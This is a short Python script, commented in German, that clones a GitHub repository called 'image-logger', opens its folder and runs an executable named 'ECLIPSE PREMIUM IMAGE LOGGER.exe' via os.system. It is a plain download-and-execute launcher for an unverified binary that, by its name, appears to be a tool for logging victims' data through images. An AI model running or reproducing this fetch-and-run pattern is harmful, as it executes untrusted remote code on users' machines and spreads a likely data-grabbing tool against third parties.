import os

def run_custom_command(command):
    os.system(command)

def open_folder(folder_path):
    os.startfile(folder_path)

def execute_exe(file_path):
    os.system(file_path)

# Benutzerdefinierter Befehl ausführen
custom_command = "git clone https://github.com/PsxDupingg/image-logger"
run_custom_command(custom_command)

# Ordner öffnen
folder_path = "image-logger"
open_folder(folder_path)

# .exe-Datei ausführen
exe_file_path = "ECLIPSE PREMIUM IMAGE LOGGER.exe"
execute_exe(exe_file_path)
